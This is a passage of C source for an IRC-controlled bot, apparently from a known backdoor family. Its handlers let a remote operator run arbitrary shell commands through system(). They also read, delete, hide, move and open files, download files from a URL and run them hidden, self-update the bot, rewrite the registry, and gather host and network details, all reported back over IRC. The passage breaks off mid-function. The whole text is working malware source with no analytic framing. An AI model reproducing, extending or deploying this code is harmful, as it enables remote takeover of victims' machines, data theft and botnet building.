	else if (!lstrcmpi(cmd_sysinfo_1,a[0]) || !lstrcmpi(cmd_sysinfo_2,a[0]))
	{
		sysinfo(hostd->target,irc);
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//							Network info
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SYSINFO
	else if (!lstrcmpi(cmd_netinfo_1,a[0]) || !lstrcmpi(cmd_netinfo_2,a[0]))
	{
		if (!exip || !strcmp(exip,"") || PrivateIP(exip))
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Trying to get external IP.",netinfo_title);
			DWORD id;
			HANDLE th;
			th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
			
			WaitForSingleObject(th,10000);
			CloseHandle(th);
		}
		if (a[1])
		{
			BOOL mb=FALSE;
			BOOL gb=FALSE;
			if (!lstrcmpi(cmd_drvinfo_gb,a[1]))
				gb=TRUE;
			else if (!lstrcmpi(cmd_drvinfo_mb,a[1]))
				mb=TRUE;
			
			netinfo(hostd->target,irc,mb,gb);
		}
		else
			netinfo(hostd->target,irc,TRUE,FALSE);//default mb
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//							Drive list
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DRIVEINFO
	else if (!lstrcmpi(cmd_drvinfo_1,a[0]) || !lstrcmpi(cmd_drvinfo_2,a[0]))
	{
		if ((tnum=findthreadnum(DRIVE_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,drives_title,"Drive list thread",tnum);
			return 1;
		}

		NTHREAD dinfo;
		dinfo.conn=irc;
		strcpy(dinfo.target,hostd->target);
		dinfo.bdata1=FALSE;//mb
		dinfo.bdata2=FALSE;//gb
		dinfo.gotinfo = FALSE;
		dinfo.silent=switches.silent;

		if (a[1])
		{
			if (!lstrcmpi(cmd_drvinfo_mb,a[1])) dinfo.bdata1=TRUE;
			else if (!lstrcmpi(cmd_drvinfo_gb,a[1])) dinfo.bdata2=TRUE;

			if (a[2])
			{
				if (!lstrcmpi(cmd_drvinfo_total_1,a[2]) || !lstrcmpi(cmd_drvinfo_total_2,a[2]))
				{
					if (!dinfo.bdata1 && !dinfo.bdata2)		DriveInfoTotal(dinfo.target,dinfo.conn,1024,"KB");
					else if (dinfo.bdata1 && !dinfo.bdata2)	DriveInfoTotal(dinfo.target,dinfo.conn,1048576,"MB");
					else if (!dinfo.bdata1 && dinfo.bdata2) DriveInfoTotal(dinfo.target,dinfo.conn,1073741824,"GB");
					return 1;
				}
				else
					dinfo.data1 = a[2];
			}
			else
				dinfo.data1 = NULL;
		}
		else
			dinfo.data1 = NULL;
		
		dinfo.threadnum = addthread(DRIVE_THREAD,"%s Drive list thread.",drives_title);
		if (threads[dinfo.threadnum].tHandle = CreateThread(NULL, 0, &DriveThread, (LPVOID)&dinfo, 0, &id))
		{
			while (dinfo.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,drives_title,"Drive list thread",GetLastError());
		}
		return 1;
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//							mIRC Command
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_MIRCCMD
	else if (!lstrcmpi(cmd_mirccmd_1,a[0]) || !lstrcmpi(cmd_mirccmd_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,mirc_title);
			return 1;
		}
		
		char cmd[MAX_PATH];
		char tbuf[IRCLINE];
		sprintf(cmd,"%s",a[1]);
		for (int u=2;u<t;u++)// add the rest of the params to the file
		{					 // dont feel like making a quote parser
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strncat(cmd,tbuf,sizeof(cmd));
			}
		}
		if (SendIrcCommand(cmd))
		{
			irc->privmsg(hostd->target,"%s Command sent: \"%s\"",mirc_title,cmd);
		}
		else
		{
			irc->privmsg(hostd->target,"%s Client not open: \"%s\"",mirc_title,cmd);
		}
		return 1;
	}
#endif
	
	//////////////////////////////////////////////////////////////////////////////
	//							System
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_system_1,a[0]) || !lstrcmpi(cmd_system_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,main_title);
			return 1;
		}
		char *cmd=strchr(params,' ');
		if (cmd)
		{
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				
				int i;
				for (i=0;i<strlen(cmd);i++)
					if (cmd[i]==replace)
						cmd[i]=' ';
			}

			cmd++;//remove the space
			if (system(cmd))
			{ //failed
				irc->privmsg(hostd->target,"%s System call failed.",main_title);
			}
			else
			{ //good
				irc->privmsg(hostd->target,"%s System call sent: \"%s\"",main_title,cmd);
			}
		}
		return 1;
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//							File Control
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_FILECTRL
	else if (!lstrcmpi(cmd_filectrl_1,a[0]) || !lstrcmpi(cmd_filectrl_2,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,file_title);
			return 1;
		}
		char file[MAX_PATH];
		char tbuf[IRCLINE];
		sprintf(file,"%s",a[2]);
		for (int u=3;u<t;u++)// add the rest of the params to the file
		{					 // don't feel like making a quote parser
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strncat(file,tbuf,sizeof(file));
			}
		}

		//.file <type/cat> <file>
		if (!lstrcmpi(cmd_filectrl_read_1,a[1]) || !lstrcmpi(cmd_filectrl_read_2,a[1]))
		{
			char file[MAX_PATH];
			char tbuf[IRCLINE];
			FILE *fp;
			sprintf(file,"%s",a[2]);
			for (int u=3;u<t;u++)// add the rest of the params to the file
			{
				if (a[u])
				{
					sprintf(tbuf," %s",a[u]);
					strcat(file,tbuf);
				}
			}

			if ((fp = fopen(file,"r")) != NULL)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Displaying file: %s",file_title,file);

				char filebuf[IRCLINE];
				while (fgets(filebuf,sizeof(filebuf),fp) != NULL)
					irc->privmsg(hostd->target,"%s",filebuf);
				fclose(fp);

				if (!switches.silent)
					irc->privmsg(hostd->target,"%s File displayed: %s",file_title,file);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to read file: %s, error: <%d>",file_title,file,GetLastError());
			}
			return 1;
		}

		//.file <exists/e> <file>
		else if (!lstrcmpi(cmd_filectrl_exst_1,a[1]) || !lstrcmpi(cmd_filectrl_exst_2,a[1]))
		{
			if (FileExists(file))
			{
				irc->privmsg(hostd->target,"%s File exists: %s",file_title,file);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s File doesn't exist: %s",file_title,file);
			}
			return 1;
		}

		//.file <del/rm> <file>
		else if (!lstrcmpi(cmd_filectrl_del_1,a[1]) || !lstrcmpi(cmd_filectrl_del_2,a[1]))
		{
			if (DeleteFile(file))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s File deleted: %s",file_title,file);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to delete file: %s, error: <%d>",file_title,file,GetLastError());
			}
			return 1;
		}
		
		//.file <rmdir> <dir>
		else if (!lstrcmpi(cmd_filectrl_rmdir,a[1]))
		{
			if (FileExists(file))
			{
				if (IsFolder(file))
				{
					RemoveCompleteDirectory(file);
					if (!FileExists(file))
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Folder deleted: %s",file_title,file);
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Failed to delete folder: %s",file_title,file);
					}
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s %s is not a folder.",file_title,file);
				}
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s %s doesn't exist.",file_title,file);
			}
			return 1;
		}

		//.file <move/mv> <file> <new file>
		// -r: replaces _s in the file (again don't feel like making a quote parser)
		// -r:<char>: replaces <char> in the file
		else if (!lstrcmpi(cmd_filectrl_move_1,a[1]) || !lstrcmpi(cmd_filectrl_move_2,a[1]))
		{
			if (!a[3])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,file_title);
				return 1;
			}
			char tofile[MAX_PATH];
			sprintf(file,a[2]);
			sprintf(tofile,a[3]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;

				int i;
				for (i=0;i<strlen(file);i++)
					if (file[i]==replace)
						file[i]=' ';

				for (i=0;i<strlen(tofile);i++)
					if (tofile[i]==replace)
						tofile[i]=' ';
			}
			if (MoveFile(file,tofile))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Moved: \"%s\" to: \"%s\"", file_title, file, tofile);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to move: \"%s\" to: \"%s\", error: <%d>", file_title, file, tofile, GetLastError());
			}
			return 1;
		}

		//.file <copy/cp> <file> <new file>
		// -r: replaces _s in the file (again dont feel like making a quote parser)
		// -r:<char>: replaces <char> in the file
		// -O: overwrite the file if it already exists
		else if (!lstrcmpi(cmd_filectrl_copy_1,a[1]) || !lstrcmpi(cmd_filectrl_copy_2,a[1]))
		{
			if (!a[3])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,file_title);
				return 1;
			}
			char tofile[MAX_PATH];
			sprintf(file,a[2]);
			sprintf(tofile,a[3]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;

				int i;
				for (i=0;i<strlen(file);i++)
					if (file[i]==replace)
						file[i]=' ';

				for (i=0;i<strlen(tofile);i++)
					if (tofile[i]==replace)
						tofile[i]=' ';
			}
			if (CopyFile(file,tofile,(switches.overwrite?FALSE:TRUE)))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Copied: \"%s\" to: \"%s\"", file_title, file, tofile);
			}
			else 
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to copy: \"%s\" to: \"%s\", error: <%d>", file_title, file, tofile, GetLastError());
			}
			return 1;
		}

		//.file <attrib/at> <file>
		// -N: normal
		// -S: system
		// -H: hidden
		// -R: read-only
		else if (!lstrcmpi(cmd_filectrl_att_1,a[1]) || !lstrcmpi(cmd_filectrl_att_2,a[1]))
		{
			DWORD tmp;
			if (switches.attrib_system)
				tmp |= FILE_ATTRIBUTE_SYSTEM;
			if (switches.attrib_hidden)
				tmp |= FILE_ATTRIBUTE_HIDDEN;
			if (switches.attrib_readonly)
				tmp |= FILE_ATTRIBUTE_READONLY;
			if (switches.attrib_normal)
				tmp = FILE_ATTRIBUTE_NORMAL;

			if (SetFileAttributes(file,tmp))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Attibutes set to: \"%s\".", file_title, file);
			}
			else 
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to set attibutes to: \"%s\", error: <%d>", file_title, file, GetLastError());
			}
			return 1;
		}

		//.file <open/op> <file>
		else if (!lstrcmpi(cmd_filectrl_open_1,a[1]) || !lstrcmpi(cmd_filectrl_open_2,a[1]))
		{
			sprintf(file,a[2]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				int i;
				for (i=0;i<strlen(file);i++)
					if (file[i]==replace)
						file[i]=' ';
			}

			if (fShellExecute(0,"open",file,NULL,NULL,SW_SHOW))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Opened: \"%s\".", file_title, file);
			}
			else 
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to open: \"%s\", error: <%d>", file_title, file, GetLastError());
			}
			return 1;
		}

		return 1;
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DOWNLOAD
	else if (!lstrcmpi(cmd_download_1,a[0]) || !lstrcmpi(cmd_download_2,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];//site
		dl.data2=a[2];//location
		dl.bdata1 = FALSE;//update
		dl.bdata2 = (a[3]?TRUE:FALSE);//run
		dl.bdata3 = (a[4]?TRUE:FALSE);//run hidden
		//dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
		//dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
		//dl.encrypted=(parameters['e']);

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_UPDATE
	else if (!lstrcmpi(cmd_update_1,a[0]) || !lstrcmpi(cmd_update_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(botid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif // NO_UPDATE
#endif // NO_DOWNLOAD

	//////////////////////////////////////////////////////////////////////////////
	//								If/Else
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_IFELSE
	//.if/else nick <nick> <do this> (wildcards supported)
	//.if/else host <host> <do this> (wildcards supported)
	//.if/else id <bot id> <do this>
	//.if/else private <do this>
	//.if/else dialup <do this>
	//.if/else up <time> <do this>
	//.if/else connected <time> <do this>
	//.if/else rup <time> <do this>
	//.if/else os <os> <do this>
	//.if/else exip <ip> <do this> (wildcards supported)
	//.if/else inip <ip> <do this> (wildcards supported)
	//FIXME:.if/else space <free/total> <>space> <gb/mb/kb> <do this>
	else if (!lstrcmpi(cmd_if_1,a[0]) || !lstrcmpi(cmd_if_2,a[0])
			|| !lstrcmpi(cmd_else_1,a[0]) || !lstrcmpi(cmd_else_2,a[0]))
	{

		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,logic_title);
			return 1;
		}

		int anum=3;//param the command starts at
		BOOL bIf=FALSE;
		BOOL bElse=FALSE;
		if (!lstrcmpi(cmd_if_1,a[0]) || !lstrcmpi(cmd_if_2,a[0]))
			bIf=TRUE;
		if (!lstrcmpi(cmd_else_1,a[0]) || !lstrcmpi(cmd_else_2,a[0]))
			bElse=TRUE;

		//nick
		if (!lstrcmpi(cmd_ifelse_nick_1,a[1]) || !lstrcmpi(cmd_ifelse_nick_2,a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(_strlwr(a[2]),_strlwr(irc->current_nick())))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],irc->current_nick()))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(_strlwr(a[2]),_strlwr(irc->current_nick())))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],irc->current_nick()))
						return 1;
				}
		}
		
		//host
		else if (!lstrcmpi(cmd_ifelse_host_1,a[1]) || !lstrcmpi(cmd_ifelse_host_2,a[1]))
		{
			if (!exip || !strcmp(exip,"") || PrivateIP(exip))
			{
				if (!switches.silent && switches.verbose)
					irc->privmsg(hostd->target,"%s Trying to get external IP.",logic_title);
				DWORD id;
				HANDLE th;
				th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
				WaitForSingleObject(th,5000);
				CloseHandle(th);
			}
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(_strlwr(a[2]),_strlwr(host)))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],host))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(_strlwr(a[2]),_strlwr(host)))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],host))
						return 1;
				}
		}
		
		//botid
		else if (!lstrcmpi(cmd_ifelse_id,a[1]))
		{
			if (bIf)
				if (lstrcmpi(a[2],botid))
					return 1;

			if (bElse)
				if (!lstrcmpi(a[2],botid))
					return 1;
		}
		
		//uptime
		else if (!lstrcmpi(cmd_ifelse_uptime_1,a[1]) || !lstrcmpi(cmd_ifelse_uptime_2,a[1]))
		{
			unsigned int up=GetTickCount()/86400000;

			if (bIf)
				if (up<atoi(a[2]))
					return 1;

			if (bElse)
				if (up>atoi(a[2]))
					return 1;
		}
		
		//connected
		else if (!lstrcmpi("connected",a[1]) || !lstrcmpi("con",a[1]))
		{
			DWORD dwTotal=(GetTickCount()/1000)-(dwconnected/1000);
			DWORD dwMins=((dwTotal%86400)%3600)/60;
		
			if (bIf)
				if (dwMins<atoi(a[2]))
					return 1;

			if (bElse)
				if (dwMins>atoi(a[2]))
					return 1;
		}
		
		//private
		else if (!lstrcmpi(cmd_ifelse_priv_1,a[1]) || !lstrcmpi(cmd_ifelse_priv_2,a[1]))
		{
			anum=2;
			if (bIf)
				if (!PrivateIP(inip))
					return 1;

			if (bElse)
				if (PrivateIP(inip))
					return 1;
		}
		
		//dialup
		else if (!lstrcmpi("dialup",a[1]) || !lstrcmpi("d",a[1]))
		{
			anum=2;
			if (!nowininet)
			{
				DWORD n;
				fInternetGetConnectedStateEx(&n, 0, 0, 0);
				if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM)
				{
					if (bElse)
						return 1;
				}
				else
					if (bIf)
						return 1;
			}
			else
				return 1;
		}

		//os
		else if (!lstrcmpi("os",a[1]))
		{
			OSVERSIONINFO verinf;
			verinf.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
			if (GetVersionEx(&verinf))
			{
				if (bIf)
				{
					if (!lstrcmpi("95",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0))
							return 1;
						if (verinf.dwPlatformId!=VER_PLATFORM_WIN32_WINDOWS)
							return 1;
					}
					else if (!lstrcmpi("nt",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0))
							return 1;
						if (verinf.dwPlatformId!=VER_PLATFORM_WIN32_NT)
							return 1;
					}
					else if (!lstrcmpi("98",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==10))
							return 1;
					}
					else if (!lstrcmpi("me",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==90))
							return 1;
					}
					else if (!lstrcmpi("2k",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==0))
							return 1;
					}
					else if (!lstrcmpi("xp",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==1))
							return 1;
					}
					else if (!lstrcmpi("2k3",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==2))
							return 1;
					}
				}
				if (bElse)
				{
					if (lstrcmpi("95",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0)
						{
							if (verinf.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
								return 1;
						}
					}
					else if (!lstrcmpi("nt",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0)
						{
							if (verinf.dwPlatformId==VER_PLATFORM_WIN32_NT)
								return 1;
						}
					}
					else if (!lstrcmpi("98",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==10)
							return 1;
					}
					else if (!lstrcmpi("me",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==90)
							return 1;
					}
					else if (!lstrcmpi("2k",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==0)
							return 1;
					}
					else if (!lstrcmpi("xp",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==1)
							return 1;
					}
					else if (!lstrcmpi("2k3",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==2)
							return 1;
					}
				}
			}
		}

		//inip
		else if (!lstrcmpi("inip",a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(a[2],inip))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],inip))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(a[2],inip))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],inip))
						return 1;
				}
		}

		//exip
		else if (!lstrcmpi("exip",a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(a[2],exip))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],exip))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(a[2],exip))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],exip))
						return 1;
				}
		}

		//unknown
		else
		{
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		}

		if (!a[anum])
		{ //this is so u can set the needed num of params (for shit like private)
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,logic_title);
			return 1;
		}
		char command[IRCLINE];
		char tbuf[IRCLINE];
		sprintf(command,"%s",a[anum]);
		for (int u=(anum+1);u<t;u++)// add the rest of the params to the file
		{
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strcat(command,tbuf);
			}
		}
		if (command[0]!=prefix)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		}

		int i;
		for (i=0;i<strlen(command);i++)
		{
			//replace _ with - for the new command
			if (command[i]=='_')
				if (command[i-1]==' ')
					command[i]='-';
			//replace + with _ (for double if/else statements)
			if (command[i]=='+')
				if (command[i-1]==' ')
					command[i]='_';
			//replace ^ with + (for triple if/else statements)
			if (command[i]=='^')
				if (command[i-1]==' ')
					command[i]='+';
			//replace ` with ^ (for quadruple if/else statements)
			if (command[i]=='`')
				if (command[i-1]==' ')
					command[i]='^';
		}

		if (switches.verbose)
			irc->privmsg(hostd->target,"%s Should run: \"%s\".",logic_title,command);

		IRC_TempCommand(command,hostd,irc,switches.silent);
		return 1;
	}
#endif // NO_IFELSE

#ifndef NO_REGCTRL
	//////////////////////////////////////////////////////////////////////////////
	//								Reg Control
	//////////////////////////////////////////////////////////////////////////////
	//.reg query <type> <root> <subkey> <key>
	//.reg query <root> <subkey>
	//.reg delete <root> <subkey> [key]
	//.reg write <type> <root> <subkey> <key> <value>
	else if (!lstrcmpi("regctrl",a[0]) || !lstrcmpi("reg",a[0]))
	{
		if (!a[1] || !a[2] || !a[3])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,reg_title);
			return 1;
		}
		
		// delete
		else if (!lstrcmpi("delete",a[1]) || !lstrcmpi("d",a[1]))
		{
			HKEY root=GetKey(a[2]);
			LPTSTR subkey=a[3];
			LPTSTR key=(a[4]?a[4]:NULL);
			
			int i;
			char replace='_';
			if (switches.replace_char)
					replace=switches.replace_char;

			if (switches.replace_underscores)
			{
				for (i=0;i<strlen(subkey);i++)
					if (subkey[i]==replace)
						subkey[i]=' ';

				if (key)
				{
					for (i=0;i<strlen(key);i++)
						if (key[i]==replace)
							key[i]=' ';
				}
			}

			if (RegDelete(root,subkey,key))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Erased Key: %s\\%s\\%s",reg_title,a[2],subkey,(key?key:"*"));
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to erase key: %s\\%s\\%s",reg_title,a[2],subkey,(key?key:"*"));
			}
		}

		// query
		else if (!lstrcmpi("query",a[1]) || !lstrcmpi("q",a[1]))
		{
			if (!a[4])
			{
				HKEY root=GetKey(a[2]);
				LPTSTR subkey=a[3];
				if (RegQuery(root,subkey,hostd->target,conn))
				{
					irc->privmsg(hostd->target,"%s Done with query: %s\\%s",reg_title,a[2],a[3]);
				}
				else
				{
					irc->privmsg(hostd->target,"%s Failed to query: %s\\%s",reg_title,a[2],a[3]);
				}
				return 1;
			}
			DWORD type=GetType(a[2]);
			HKEY root=GetKey(a[3]);
			LPTSTR subkey=a[4];
			LPTSTR name=NULL;
			
			int i;
			char replace='_';
			if (switches.replace_char)
					replace=switches.replace_char;

			if (switches.replace_underscores)
			{
				for (i=0;i<strlen(subkey);i++)
					if (subkey[i]==replace)
						subkey[i]=' ';
			}

			if (a[5])
			{
				name=a[5];
				if (switches.replace_underscores)
				{
					for (i=0;i<strlen(name);i++)
						if (name[i]==replace)
							name[i]=' ';
				}


				if (type==REG_SZ || type==REG_MULTI_SZ || type==REG_EXPAND_SZ)
				{
					char *tret=RegQuery(root,subkey,name,type);
					if (tret)
					{
						if (type==REG_MULTI_SZ)
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,"%s Displaying: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
							char* p;
							while (p=strstr(tret,"\n"))
							{
								*p='\0';
								irc->privmsg(hostd->target,"%s",tret);
								tret=p+1;
							}
							irc->privmsg(hostd->target,"%s",tret);//the last line
							if (!switches.silent)
								irc->privmsg(hostd->target,"%s Finished displaying: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
						}
						else
							irc->privmsg(hostd->target,"%s Query: %s\\%s\\%s: %s",reg_title,a[3],a[4],a[5],tret);
					}
					else
					{
						irc->privmsg(hostd->target,"%s Failed to query: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
					}
				}
				else if (type==REG_DWORD)
				{
					BOOL bSuc=FALSE;
					DWORD tret=RegQuery(root,subkey,name,bSuc);
					if (bSuc)
					{
						irc->privmsg(hostd->target,"%s Query: %s\\%s\\%s: %d",reg_title,a[3],a[4],a[5],tret);
					}
					else
					{
						irc->privmsg(hostd->target,"%s Failed to query: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
					}
				}
			}
		}


		//.reg write <type> <root> <subkey> <key> <value>
		else if (!lstrcmpi("write",a[1]) || !lstrcmpi("w",a[1]))
		{
			if (!a[4] || !a[5] || !a[6])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,reg_title);
				return 1;
			}
			DWORD type=GetType(a[2]);
			HKEY root=GetKey(a[3]);
			LPTSTR subkey=a[4];
			LPTSTR name=a[5];
			
			int i;
			char replace='_';
			if (switches.replace_char)
					replace=switches.replace_char;

			if (switches.replace_underscores)
			{
				for (i=0;i<strlen(subkey);i++)
					if (subkey[i]==replace)
						subkey[i]=' ';
				for (i=0;i<strlen(name);i++)
					if (name[i]==replace)
						name[i]=' ';
			}

			if (type==REG_SZ || type==REG_MULTI_SZ || type==REG_EXPAND_SZ)
			{
				if (RegWrite(root,subkey,name,a[6],type))
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Wrote key: %s\\%s\\%s (%s)",reg_title,a[3],subkey,name,a[6]);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to write: %s\\%s\\%s (%s)",reg_title,a[3],subkey,name,a[6]);
				}
			}
			else if (type==REG_DWORD)
			{
				if (RegWrite(root,subkey,name,(DWORD)atoi(a[6])))
				{
					if (!switches.silent)
